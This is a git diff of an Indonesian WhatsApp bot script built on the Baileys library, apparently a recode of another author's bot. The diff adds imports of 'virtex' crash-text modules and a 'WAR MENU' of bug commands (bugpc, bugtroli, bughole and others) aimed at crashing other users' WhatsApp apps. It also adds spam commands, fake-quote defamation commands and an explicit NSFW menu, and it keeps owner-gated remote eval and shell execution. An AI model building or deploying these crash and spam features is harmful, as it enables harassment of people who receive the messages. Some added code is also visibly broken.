@@ -1,3 +1,5 @@
+//sc ini gratis bro jan di jual
+//subscribe yt Ndyie
 const
 	{
 	    WAConnection: _WAConnection,
@@ -19,6 +21,7 @@ const
 		prepareMessageFromContent, 
 		relayWAMessage
 	} = require("@adiwajshing/baileys")
+const hx = require('hxz-api')
 const simple = require('./lib/simple.js')
 const WAConnection = simple.WAConnection(_WAConnection)
 const qrcode = require('qrcode-terminal')
@@ -56,6 +59,18 @@ const { wikiSearch } = require('./lib/wiki.js')
 const { herolist } = require('./lib/herolist.js')
 const { herodetails } = require('./lib/herodetail.js')
 const { mediafireDl } = require('./lib/mediafire.js')
+const { virtex } = require('./virtex/virtex')
+const { virtex2 } = require('./virtex/virtex2')
+const { virtex3 } = require('./virtex/virtex3')
+const { virtex4 } = require('./virtex/virtex4')
+const { virtex5 } = require('./virtex/virtex5')
+const { virtex6 } = require('./virtex/virtex6')
+const { virtex7 } = require('./virtex/virtex7')
+const { virtex8 } = require('./virtex/virtex8')
+const { virtex9 } = require('./virtex/virtex9')
+const { ngazap } = require('./virtex/ngazap')
+const { virtag } = require('./virtex/virtag')
+const { emoji2 } = require('./virtex/emoji2')
 const { pinterest } = require('./lib/pinterest')
 const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
 const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
@@ -78,6 +93,8 @@ const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
 const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
 const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
 const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
+const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
+const _registered = JSON.parse(fs.readFileSync('./database/user.json'))
 const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
 const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
 const settings = JSON.parse(fs.readFileSync('./settings.json'))
@@ -95,7 +112,7 @@ battery: "" || "Tidak Terdeteksi",
 isCharge: "" || false
 }
 offline = false
-publik = false
+publik = true
 waktuafk = 'Nothing'
 alasanafk = 'Nothing'
 NamaBot = settings.NamaBot
@@ -106,6 +123,7 @@ nopref = false
 
 // APIKEY
 HunterApi = settings.HunterApi
+xchillds = 'XChillDs'
 
 const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
 
@@ -209,6 +227,9 @@ try {
 		const type = Object.keys(mek.message)[0]
 		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
 		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
+		const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
+		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
+        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
 		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
 		denz.on("CB:action,,battery", json => {
 	    const battery = json[2][0][1].value
@@ -242,7 +263,7 @@ try {
 		const dfrply = fs.readFileSync('./denz.jpg')
 		cmhit.push(command)
         mess = {
-			wait: 'Wait a minute',
+			wait: '🍏 Tunggu sebentar.....',
 			success: 'Success',
 			error: {
 				stick: 'Cannot access videos!',
@@ -250,14 +271,15 @@ try {
                 api: 'Error'
 			},
 			only: {
-				group: 'Only for within the group!',
+				group: 'Group only!',
 				ownerG: 'Only for group owners!',
-				ownerB: 'Only for bot owners!',
-				admin: 'Only for group admins!',
-				Badmin: 'Make the bot a group admin!'
+				ownerB: 'Hanya untuk owner Bot!',
+				admin: 'Hanya Untuk admin grup!',
+				Badmin: 'Bot Harus Jadi Admin!'
 			}
 		}
 		const botNumber = denz.user.jid
+		const ownerNumberr = [`${NomorOwner}@s.whatsapp.net`]
 		const isGroup = from.endsWith('@g.us')
 		const sender = mek.key.fromMe ? denz.user.jid : isGroup ? mek.participant : mek.key.remoteJid
 		const senderNumber = sender.split("@")[0] 
@@ -270,8 +292,9 @@ try {
 		const groupMembers = isGroup ? groupMetadata.participants : ''
 		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
 		const groupDesc = isGroup ? groupMetadata.desc : ''
+		const isNsfw = isGroup ? nsfww.includes(from) : false
 		const groupOwner = isGroup ? groupMetadata.owner : ''
-		const isOwner = ownerNumber.includes(sender)
+		const isOwner = ownerNumberr.includes(sender)
 		const isGroupAdmins = groupAdmins.includes(sender) || false
 		const isKickArea = isGroup ? kickarea.includes(from) : false
 		const isAntiLink = isGroup ? antilink.includes(from) : false
@@ -284,11 +307,11 @@ try {
 		}
 		if (antibot === true) return
 		const katalog = (teks) => {
-             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© Dcode Denpa_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
+             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© Ndyie_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
              denz.relayWAMessage(res)
         }
         const grupinv = (teks) => {
-        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
+        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© Ndyie_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
             denz.relayWAMessage(grup)
         }
 		idttt = []
@@ -310,36 +333,37 @@ try {
 		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 		      }
 		const ofrply = await getBuffer(pporang)
+		const thubb = fs.readFileSync('./thub.jpg')
 		const sekarang = new Date().getTime();
 			//-
 			//WAKTU
 			var ase = new Date();
                         var jamss = ase.getHours();
                          switch(jamss){
-                case 0: jamss = "Midnight"; break;
-                case 1: jamss = "Midnight"; break;
-                case 2: jamss = "Midnight"; break;
-                case 3: jamss = "Midnight"; break;
-                case 4: jamss = "Midnight"; break;
-                case 5: jamss = "Dawn"; break;
-                case 6: jamss = "Morning"; break;
-                case 7: jamss = "Morning"; break;
-                case 8: jamss = "Morning"; break;
-                case 9: jamss = "Morning"; break;
-                case 10: jamss = "Morning"; break;
-                case 11: jamss = "Afternoon"; break;
-                case 12: jamss = "Zuhur"; break;
-                case 13: jamss = "Afternoon"; break;
-                case 14: jamss = "Afternoon"; break;
-                case 15: jamss = "Asr"; break;
-                case 16: jamss = "Afternoon"; break;
-                case 17: jamss = "Evening"; break;
-                case 18: jamss = "Maghrib"; break;
-                case 19: jamss = "Isha"; break;
-                case 20: jamss = "Night"; break;
-                case 21: jamss = "Night"; break;
-                case 22: jamss = "Midnight"; break;
-                case 23: jamss = "Midnight"; break;
+                case 0: jamss = "Tengah Malam"; break;
+                case 1: jamss = "Tengah Malam"; break;
+                case 2: jamss = "Tengah Malam"; break;
+                case 3: jamss = "Tengah Malam"; break;
+                case 4: jamss = "Tengah Malam"; break;
+                case 5: jamss = "Fajar"; break;
+                case 6: jamss = "Pagi"; break;
+                case 7: jamss = "Pagi"; break;
+                case 8: jamss = "Pagi"; break;
+                case 9: jamss = "Pagi"; break;
+                case 10: jamss = "Pagi"; break;
+                case 11: jamss = "Siang"; break;
+                case 12: jamss = "Waktu Zuhur"; break;
+                case 13: jamss = "Siang"; break;
+                case 14: jamss = "Siang"; break;
+                case 15: jamss = "Waktu Ashar"; break;
+                case 16: jamss = "Siang"; break;
+                case 17: jamss = "Sore"; break;
+                case 18: jamss = "Waktu Magrib"; break;
+                case 19: jamss = "Waktu Isha"; break;
+                case 20: jamss = "Malam"; break;
+                case 21: jamss = "Malam"; break;
+                case 22: jamss = "Tengah Malam"; break;
+                case 23: jamss = "Tengah Malam"; break;
             }
             var tampilUcapan = "" + jamss;
             const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
@@ -353,6 +377,7 @@ try {
 				month: 'long',
 				year: 'numeric'
 		       })
+		
  // FAKE REPLY BY YOGI PEWE
 // PRODUCT
 const ftok = {
@@ -587,7 +612,7 @@ denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
             if (isAfk(mek.key.remoteJid)) return
             addafk(mek.key.remoteJid)
 			heheh = ms(Date.now() - waktuafk)
-		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Dcode Denpa_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
+		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Ndyie_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
 			}
 		}
 		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
@@ -600,7 +625,7 @@ denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
                         if (isAfk(mek.key.remoteJid)) return
                         addafk(mek.key.remoteJid)
 						heheh = ms(Date.now() - waktuafk)
-			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Dcode Denpa_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
+			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Ndyie_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
 					}
 				}
 						}
@@ -664,7 +689,7 @@ denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 	        denz.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
             }
 		const reply = (teks) => {
-			denz.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
+			denz.sendMessage(from, teks, text, { thumbnail: thubb, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:thubb,sourceUrl:`https://youtube.com/c/YuzzuKamiyaka`}}})
 		}
 		const simir = (teks) => {
 			denz.sendMessage(from, teks, text, { quoted:ftrol })
@@ -673,7 +698,7 @@ denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 				return Math.floor(teks)
 		}
 		const sendMess = (hehe, teks) => {
-			denz.sendMessage(hehe, teks, text, { quoted: tok, contextInfo: { forwardingScore: 508, isForwarded: true}})
+			denz.sendMessage(hehe, teks, text, { quoted: ftok, contextInfo: { forwardingScore: 508, isForwarded: true}})
 		}
 		const mentions = (teks, memberr, id) => {
 			(id == null || id == undefined || id == false) ? denz.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : denz.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
@@ -749,7 +774,7 @@ return reply(parse)
                 }
                 return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
             } 
-           if (budo.startsWith(`>`)){
+           /*if (budo.startsWith(`>`)){
            	if (!isOwner) return
 				const sep = budo.split("\n")
                 let exc = budo.replace(sep[0]+"\n", "")
@@ -758,13 +783,29 @@ return reply(parse)
                 }
                 console.log(exc)
                 eval("(async () => {try{"+exc+"}catch(e){denz.sendMessage(from,  e.toString())}})()")
-			}
+			}*/
+			if (budy.startsWith('>')){
+if (!isOwner)return //reply(`Perintah ini tidak bisa Di lakukan oleh Jadibot sementara`)//
+console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
+ras = budy.slice(1)
+function _(rem) {
+ren = JSON.stringify(rem,null,2)
+pes = util.format(ren)
+reply(pes)
+}
+try{c
+reply(require('util').format(eval(`(async () => { ${ras} })()`)))
+} catch(err) {
+e = String(err)
+reply(e)
+}
+}
 			if (budo.startsWith(`$`)){
 				if (!isOwner) return
 				const sep = budo.split("\n")
                 let exc = budo.replace(sep[0]+"\n", "")
                 exec(exc, (err, stdout) => {
-					if (err) return denz.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, { quoted: mek })
+					if (err) return denz.sendMessage(from, `root @Ndyie-Botz:~ ${err}`, text, { quoted: mek })
 					if (stdout) {
 						denz.sendMessage(from, stdout, text)
 					}
@@ -894,41 +935,306 @@ denz.updatePresence(from, Presence.recording)
         switch (command) {
         case 'menu':
         case 'help':
+        ptod = "0@s.whatsapp.net"
+        xtod = "6283844009539@s.whatsapp.net"
         stod = `${sender}`
+        //uwu = '```'//
        stst = await denz.getStatus(`${sender.split('@')[0]}@c.us`)
 				stst = stst.status == 401 ? '' : stst.status
 			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
-       menu = `┌───「 \`\`\`${NamaBot}\`\`\` 」
+       menu = `
+╭─❒ 「 Gliders Botz Info 」 ❒
 │
-├ _Creator : @${dtod.split('@')[0]}_
-├ _Battery : ${baterai.battery}_
-├ _Mode : ${publik ? 'Public' : 'Self'}_
-├ _Total Hit : ${cmhit.length}_
-├ _Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}_
 │
-├───「 \`\`\`INFO BOT\`\`\` 」
+│◦➛Creator : @${xtod.split('@')[0]}
+│◦➛Recode : @${ptod.split('@')[0]}
+│◦➛Battery : ${baterai.battery}
+│◦➛Mode : ${publik ? 'Public' : 'Self'}
+│◦➛Total Hit : ${cmhit.length}
+│◦➛Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
+│◦➛Nomor Owner : @${otod.split('@')[0]}
+│◦➛Auto Composing : ${settings.autocomposing}
+└❏Auto Recording : ${settings.autorecording}
+
+╭─❒ 「 User Info 」 ❒
 │
-├ _Nama Bot : ${NamaBot}_
-├ _Nama Owner : ${NamaOwner}_
-├ _Nomor Owner : @${otod.split('@')[0]}_
-├ _Auto Composing : ${settings.autocomposing}_
-├ _Auto Recording : ${settings.autorecording}_
 │
-├───「 \`\`\`INFO USER\`\`\` 」
+│◦➛Status : ${isOwner ? 'Owner' : 'User'}
+│◦➛Nama : ${pushname}
+│◦➛Bio : ${stst}
+│◦➛Nomor : @${stod.split('@')[0]}
+│◦➛Info Nomor : ${num.data.countrycode} - ${num.data.carrier.type} - ${num.data.carrier.name}
+└❏
+
+┌❏ TO DAY
 │
-├ _Status : ${isOwner ? 'Owner' : 'User'}_
-├ _Nama : ${pushname}_
-├ _Bio : ${stst}_
-├ _Nomor : @${stod.split('@')[0]}_
-├ _Info Nomor : ${num.data.country_code} - ${num.data.carrier.type} - ${num.data.carrier.name}_
+│◦➛${tampilUcapan}
+│◦➛Jam : ${jmn}
+│◦➛Hari : ${week} ${weton}
+└❏Tanggal : ${calender}
+
+┌❏ INDONESIA TIME
 │
-└───「 \`\`\`${NamaBot}\`\`\` 」`
-sendButLocation(from, `${menu}`, "*_© Dcode Denpa_*", {jpegThumbnail:ofrply}, [{buttonId:`${prefix}command`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'DEVELOPER'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'SOURCE CODE'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
+│◦➛Wib : ${timeWib}
+│◦➛Wita : ${timeWita}
+└❏Wit : ${timeWit}  
+
+╭─❒ LIST COMMAND!
+│
+├─❒ OWNER
+│
+│◦➛${prefix}autorespon [ on/off ]
+│◦➛${prefix}bc [ teks/reply gif/image/video with caption ]
+│◦➛${prefix}tobc [ reply sticker/audio with caption ]
+│◦➛${prefix}return [ javascript ]
+│◦➛${prefix}clearall
+│◦➛${prefix}delchat
+│◦➛${prefix}mute
+│◦➛${prefix}unmute
+│◦➛${prefix}public
+│◦➛${prefix}self
+│◦➛${prefix}spam [ teks|jumlah ]
+│◦➛${prefix}demoteall
+│◦➛${prefix}promoteall
+│◦➛${prefix}addcmd [ teks reply stc ]
+│◦➛${prefix}delcmd [ reply stc ]
+│◦➛${prefix}listcmd
+│◦➛${prefix}spamsw [ teks|jumlah ]
+│◦➛${prefix}upswteks [ teks ]
+│◦➛${prefix}upswlokasi [ teks ]
+│◦➛${prefix}upswaudio [ reply audio ]
+│◦➛${prefix}upswvoice [ reply audio ]
+│◦➛${prefix}upswsticker [ reply sticker ]
+│◦➛${prefix}upswimage [ reply image with caption ]
+│◦➛${prefix}upswgif [ reply gif with caption ]
+│◦➛${prefix}upswvideo [ reply video with caption ]
+│◦➛${prefix}shutdown
+│◦➛${prefix}offline [ alasan ]
+│◦➛${prefix}online
+│◦➛${prefix}exif [ nama|author ]
+│◦➛${prefix}setprofile [ reply image ]
+│◦➛${prefix}setname [ teks ]
+│◦➛${prefix}setprefix [ multi/nopref ]
+│◦➛${prefix}setbio [ teks ]
+│◦➛${prefix}leave
+│◦➛${prefix}restart
+│◦➛${prefix}join [ link group ]
+│◦➛${prefix}addrespon [ tanya|jawab ]
+│◦➛${prefix}delrespon [ nama ]
+│◦➛${prefix}q [ reply message ]
+│
+├─❒ WAR MENU [ Owner only ]
+│
+│◦➛${prefix}virtex
+│◦➛${prefix}bugkatalog
+│◦➛${prefix}bugloc
+│◦➛${prefix}bugrow
+│◦➛${prefix}buglink
+│◦➛${prefix}bugbutton
+│◦➛${prefix}bug [ jumlah ]
+│◦➛${prefix}bugpc2 [ jumlah ]
+│◦➛${prefix}bugtroli2 [ jumlah ]
+│◦➛${prefix}bugtroli3
+│◦➛${prefix}bugpc
+│◦➛${prefix}bugcombine
+│◦➛${prefix}bugtroli
+│◦➛${prefix}buglokasi
+│◦➛${prefix}bughole
+│
+├─❒ DOWNLOAD
+│
+│◦➛${prefix}infogempa
+│◦➛${prefix}herolist
+│◦➛${prefix}herodetail [ hero ]
+│◦➛${prefix}google [ search ]
+│◦➛${prefix}gimage [ search ]
+│◦➛${prefix}wiki [ search ]
+│◦➛${prefix}mediafire [ link ]
+│◦➛${prefix}ytsearch [ judul ]
+│◦➛${prefix}ytmp4 [ link yt ]
+│◦➛${prefix}ytmp3 [ link yt ]
+│◦➛${prefix}play [ judul lagu ]
+│◦➛${prefix}video [ judul video ]
+│◦➛${prefix}tinyurl [ link ]
+│◦➛${prefix}fetch [ link ]
+│◦➛${prefix}igdl [ link ]
+│◦➛${prefix}tiktokdl [ link ]
+│◦➛${prefix}pinterest [ search ]
+│◦➛${prefix}lirik [ judul ]
+│◦➛${prefix}tourl [ reply image/video ]
+│◦➛${prefix}resepmasakan [ judul ]
+│◦➛${prefix}artimimpi [ teks ]
+│◦➛${prefix}bilangangka [ angka ]
+│◦➛${prefix}kalkulator [ angka ]
+│◦➛${prefix}fancytext [ teks ]
+│◦➛${prefix}githubstalk [ username ]
+│◦➛${prefix}translate [ kodebhs|teks ]
+│◦➛${prefix}ss [ link ]
+│◦➛${prefix}tiktokaudio [ link ]
+│◦➛${prefix}igstory [ link ]
+│◦➛${prefix}linkwa
+│◦➛${prefix}playstore [ query ]
+│◦➛${prefix}fb [ link ]
+│◦➛${prefix}twitter [ link ]
+│
+├─❒ MAKER
+│
+│◦➛${prefix}foliokiri 「 text 」
+│◦➛${prefix}foliokanan 「 text 」
+│◦➛${prefix}nuliskanan 「 text 」
+│◦➛${prefix}nuliskiri 「 text 」
+│◦➛${prefix}matrix [ teks ]
+│◦➛${prefix}googletxt [ teks ]
+│◦➛${prefix}spiderman [ teks ]
+│◦➛${prefix}express [ teks ]
+│◦➛${prefix}dance [ teks ]
+│◦➛${prefix}blackbird [ teks ]
+│◦➛${prefix}halloween [ teks ]
+│◦➛${prefix}vampire [ teks ]
+│◦➛${prefix}codetxt [ teks ]
+│◦➛${prefix}text3d [ teks ]
+│◦➛${prefix}warrior [ teks ]
+│◦➛${prefix}maker2d2 「 text 」
+│◦➛${prefix}maker2d3 「 text 」
+│◦➛${prefix}maker2d4 「 text 」
+│◦➛${prefix}maker3d 「 text 」
+│◦➛${prefix}maker3d2 「 text 」
+│◦➛${prefix}maker3d3 「 text 」
+│◦➛${prefix}maker3d4 「 text 」
+│◦➛${prefix}transformer 「 text 」
+│◦➛${prefix}googletxt 「 text 」
+│◦➛${prefix}battlefield 「 text 」
+│◦➛${prefix}coffeecup 「 text 」
+│◦➛${prefix}coffeecup2 「 text 」
+│◦➛${prefix}neon 「 text 」
+│◦➛${prefix}glow 「 text 」
+│◦➛${prefix}summer 「 text 」
+│◦➛${prefix}flower 「 text 」
+│◦➛${prefix}burn 「 text 」
+│◦➛${prefix}quote 「 text 」
+│◦➛${prefix}wooden 「 text 」
+│◦➛${prefix}golden 「 text 」
+│
+├──❒ GROUP
+│
+│◦➛${prefix}getpict [ @tag ]
+│◦➛${prefix}getname [ reply target ]
+│◦➛${prefix}getbio [ reply target ]
+│◦➛${prefix}promote [ @tag ]
+│◦➛${prefix}demote [ @tag ]
+│◦➛${prefix}antilink [ 1/0 ]
+│◦➛${prefix}nsfw [ 1/0 ]
+│◦➛${prefix}creategrup [ nama|@tag ]
+│◦➛${prefix}tictactoe [ @tag ]
+│◦➛${prefix}delttt
+│◦➛${prefix}getpp
+│◦➛${prefix}kick [ @tag ]
+│◦➛${prefix}add [ nomor ]
+│◦➛${prefix}getdeskgc
+│◦➛${prefix}sider [ reply pesan bot ]
+│◦➛${prefix}hacked [ teks ]
+│◦➛${prefix}setnamegc [ teks ]
+│◦➛${prefix}setdeskgc [ teks ]
+│◦➛${prefix}fitnah [ @tag|teks1|teks2 ]
+│◦➛${prefix}kontak [ @tag|nama ]
+│◦➛${prefix}kontag [ @tag|nama ]
+│◦➛${prefix}opengc
+│◦➛${prefix}closegc
+│◦➛${prefix}resetlinkgc
+│◦➛${prefix}linkgrup
+│◦➛${prefix}hidetag [ teks ]
+│◦➛${prefix}sticktag [ nama sticker ]
+│◦➛${prefix}totag [ reply media ]
+│
+├─❒ NSFW
+│
+│◦➛${prefix}trapnime
+│◦➛${prefix}neko
+│◦➛${prefix}megumin
+│◦➛${prefix}blowjob
+│◦➛${prefix}hentai
+│◦➛${prefix}awoo
+│◦➛${prefix}bj 
+│◦➛${prefix}eroneko
+│◦➛${prefix}lesbian
+│◦➛${prefix}anal
+│◦➛${prefix}yuri
+│◦➛${prefix}baka
+│◦➛${prefix}neko2
+│◦➛${prefix}wallpaper
+│◦➛${prefix}pussy
+│◦➛${prefix}kitsune
+│◦➛${prefix}keta
+│◦➛${prefix}neko2
+│◦➛${prefix}poke
+│◦➛${prefix}slap
+│◦➛${prefix}komiku [ query ]
+│◦➛${prefix}otaku [ query ]
+│◦➛${prefix}chara [ query ]
+│
+├─❒ TOOLS
+│
+│◦➛${prefix}getscmd
+│◦➛${prefix}stickerwm [ nama|author ]
+│◦➛${prefix}takestick [ nama|author ]
+│◦➛${prefix}colong [ reply sticker ]
+│◦➛${prefix}sticker
+│◦➛${prefix}semoji [ emoji ]
+│◦➛${prefix}attp [ teks ]
+│◦➛${prefix}toimg
+│◦➛${prefix}tomp3 [ reply video ]
+│◦➛${prefix}tomp4 [ reply sticker gif ]
+│◦➛${prefix}robot [ reply audio ]
+│◦➛${prefix}balik [ reply audio ]
+│◦➛${prefix}bass [ reply audio ]
+│◦➛${prefix}gemuk [ reply audio ]
+│◦➛${prefix}detikvn [ reply audio caption angka ]
+│◦➛${prefix}detikvideo [ reply video caption angka ]
+│◦➛${prefix}tts [ kodebhs teks ]
+│
+├─❒ STORAGE
+│
+│◦➛${prefix}addsticker [ nama ]
+│◦➛${prefix}delsticker [ nama ]
+│◦➛${prefix}addvn [ nama ]
+│◦➛${prefix}delvn [ nama ]
+│◦➛${prefix}addimage [ nama ]
+│◦➛${prefix}delimage [ nama ]
+│◦➛${prefix}listimage
+│◦➛${prefix}liststicker
+│◦➛${prefix}listvn
+│
+├─❒ JADI BOT [ di nonaktifkan ]
+│
+│◦➛${prefix}stopjadibot
+│◦➛${prefix}jadibot
+│
+├─❒ OTHER / FUN
+│
+│◦➛${prefix}caripesan [ teks|jumlah ]
+│◦➛${prefix}slots
+│◦➛${prefix}suit [ gunting/batu/kertas ]
+│◦➛${prefix}tag [ nomor ]
+│◦➛${prefix}tagme
+│◦➛${prefix}readmore [ teks1|teks2 ]
+│◦➛${prefix}fitnahpc [ nomor|teks1|teks2 ]
+│◦➛${prefix}chat [ nomor|teks ]
+│◦➛${prefix}fdeface [ replyimg link|teks1|teks2 ]
+│◦➛${prefix}listgrup
+│◦➛${prefix}baileys [ reply message ]
+│◦➛${prefix}getcaption [ reply message ]
+│◦➛${prefix}pantun
+│◦➛${prefix}tospam [ reply audio/sticker/image|jumlah ]
+│◦➛${prefix}sharelock [ teks1|teks2 ]
+│◦➛${prefix}dadu
+└─────────────────❒
+`
+sendButLocation(from, `${menu}`, `R I Z Z U 右`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}command`,buttonText:{displayText:'MENU LIST📒'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'DEVELOPER👤'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'SCRIPT🌹'},type:1}], {contextInfo: { mentionedJid: [ptod,xtod,otod,stod]}})
 break
 case 'command':
  listMsg = {
  buttonText: 'LIST MENU',
- footerText: '*_© Dcode Denpa_*',
+ footerText: '*_©Gliders_*',
  description: `Hai kak @${stod.split('@')[0]}, Silahkan pilih menu disini`,
  sections: [
                      {
@@ -971,6 +1277,10 @@ case 'command':
                               "rowId": ""
                            },
                            {
+                              "title": "NsfwMenu",
+                              "rowId": ""
+                           },
+                           {
                               "title": "OtherMenu",
                               "rowId": ""
                            },
@@ -987,184 +1297,729 @@ break
 case 'ownermenu':
 menu = `❏ 「 \`\`\`MENU OWNER\`\`\` 」
 ├────────────────────
-├ ${prefix}stopjadibot
-├ ${prefix}autorespon [ _on/off_ ]
-├ ${prefix}bc [ _teks/reply gif/image/video with caption_ ]
-├ ${prefix}tobc [ _reply sticker/audio with caption_ ]
-├ ${prefix}return [ _javascript_ ]
-├ ${prefix}clearall
-├ ${prefix}delchat
-├ ${prefix}mute
-├ ${prefix}unmute
-├ ${prefix}public
-├ ${prefix}self
-├ ${prefix}spam [ _teks|jumlah_ ]
-├ ${prefix}demoteall
-├ ${prefix}promoteall
-├ ${prefix}addcmd [ _teks reply stc_ ]
-├ ${prefix}delcmd [ _reply stc_ ]
-├ ${prefix}listcmd
-├ ${prefix}spamsw [ _teks|jumlah_ ]
-├ ${prefix}upswteks [ _teks_ ]
-├ ${prefix}upswlokasi [ _teks_ ]
-├ ${prefix}upswaudio [ _reply audio_ ]
-├ ${prefix}upswvoice [ _reply audio_ ]
-├ ${prefix}upswsticker [ _reply sticker_ ]
-├ ${prefix}upswimage [ _reply image with caption_ ]
-├ ${prefix}upswgif [ _reply gif with caption_ ]
-├ ${prefix}upswvideo [ _reply video with caption_ ]
-├ ${prefix}shutdown
-├ ${prefix}offline [ _alasan_ ]
-├ ${prefix}online
-├ ${prefix}exif [ _nama|author_ ]
-├ ${prefix}setprofile [ _reply image_ ]
-├ ${prefix}setname [ _teks_ ]
-├ ${prefix}setprefix [ _multi/nopref_ ]
-├ ${prefix}setbio [ _teks_ ]
-├ ${prefix}addsticker [ _nama_ ]
-├ ${prefix}delsticker [ _nama_ ]
-├ ${prefix}addvn [ _nama_ ]
-├ ${prefix}delvn [ _nama_ ]
-├ ${prefix}addimage [ _nama_ ]
-├ ${prefix}delimage [ _nama_ ]
-├ ${prefix}bug [ _jumlah_ ]
-├ ${prefix}bugpc2 [ _jumlah_ ]
